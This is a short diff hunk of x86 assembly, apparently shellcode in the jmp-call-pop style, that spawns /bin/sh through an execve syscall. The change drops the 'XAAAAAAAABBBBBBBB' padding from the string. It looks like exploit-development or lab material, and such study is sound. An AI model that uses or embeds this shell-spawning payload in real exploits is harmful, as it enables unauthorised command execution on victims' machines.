@@ -12,4 +12,4 @@ one:
     syscall; execve("/bin/sh",["/bin//sh",NULL],[NULL])
 two:
     call one
-    db '/bin/shXAAAAAAAABBBBBBBB'
+    db '/bin/sh'
